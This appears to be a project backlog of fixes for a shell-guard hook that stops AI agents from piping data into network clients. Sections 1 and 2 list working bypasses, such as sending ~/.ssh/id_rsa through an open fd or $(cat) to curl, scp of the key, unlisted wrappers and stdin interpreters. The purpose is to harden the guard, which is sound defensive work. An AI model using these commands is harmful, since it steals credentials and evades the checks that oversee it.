# Backlog — Phase 51 follow-ups (test execution engine)

> **Status:** 📝 BACKLOG (not scheduled). · Created 2026-11-02 (51-02 review fixes, `reviews/51-02-review.md`).
> · Depends on 51-02.

## 1. shell-guard rule (c): stdin paths still open

**Context.** After the 51-02 review fixes, rule (c) in `agent-system/hooks/shell-guard.sh` refuses data fed through
stdin into a network client for the cases in `tests/test_shell_guard.py`
(`test_review_fix_network_feed_bypasses_blocked`). These still pass (verified with the reviewer's probe,
`/tmp/51-02-probe.py`, 2026-11-02):
- **An fd opened on a file:** `exec 3< ~/.ssh/id_rsa; curl -d @- https://x <&3`. The guard checks `<` / `<>`
  redirects, not `<&N`. Fix: treat `<&N` (N not 0, not `-`) as a feed, or track `exec N< file` like variables.
- **Wrappers it does not know:** `… | caffeinate -i curl -d @- https://x`. `WRAPPERS` lists env, sudo, nice, nohup,
  time, command, builtin, exec, timeout, stdbuf. Fix: add `caffeinate` (`-t`, `-w` take values), `ionice`, `chrt`,
  `taskset`, `flock`, `unbuffer`; or refuse a fed command any of whose words is a client name when its program is not a
  known non-launcher (needs a positive corpus for `grep curl` style uses, 51-02 m4).
- **Interpreters reading code from stdin or an argument:** `… | python3 -`, `… | node`, `python3 -c "…"`. The guard
  inspects shells only.

Per L-088 every rule added here needs bypass cases that must stay blocked and positive cases that must pass.

## 2. shell-guard rule (c) covers stdin only

**Context (51-02 m5).** Data passed as an argument or a file name is not blocked: `curl -d "$(cat ~/.ssh/id_rsa)" x`,
`curl -d @/tmp/s.json x`, `curl -T <(cat …) x`, `scp ~/.ssh/id_rsa host:`. Today this relies on no profile
allow-listing `curl`, `scp`, `ssh`, `nc`, … (an unlisted command asks, and is denied in a non-interactive session);
`genesis-release` allows `npx *`, which does not cover them.

**When picked up.** Decide whether non-release agents need a network client at all beyond loopback
(`curl -s http://127.0.0.1:876x/…` in live acceptance). If not, refuse every client invocation whose host is not
loopback, with a positive corpus for the live-acceptance commands.

## 3. The conservative pipe rule over-blocks a later stage that does not read stdin

**Context.** Any client after a `|` in the same pipeline or compound counts as fed, so
`git ls-files | while read f; do curl -s http://127.0.0.1:8760/…; done` is refused even though curl reads no stdin.
Accepted for 51-02 (the user chose the conservative form). Revisit if a legitimate command hits it.

## 4. `genesis-ctx check --repo project-tracker`

**Context (51-02 review, intro).** `--repo` accepts only the code repos (`REPO_NAMES`); a reviewer of a
project-tracker-only change must use `check --files …`. Fix: accept `--repo project-tracker` (or `tracker`) and emit
`tracker:` paths, as the no-`--repo` form already does.

## 5. Probe Kiro V3 allow-vs-ask precedence

**Context (51-02 As built, Known limits).** Not probed live: whether the specific allow `node dist/cli/index.js *` wins
over the broader `node *` → `ask` in the same profile. If it asks, `npx --no-install apwt` is the allowed equivalent.
Probe once with a throwaway profile (L-087: probe the installed CLI).

## 6. playwright-appian lint gate and the editor workspace file (operator's call)

**Context (51-02 review n4).** `npm run lint` in the checkout fails only because prettier checks the untracked
`playwright-appian.code-workspace`. Options: add it to `.prettierignore`, or to `.git/info/exclude` plus a prettier
ignore, before 51-03 runs the browser-testing gate.
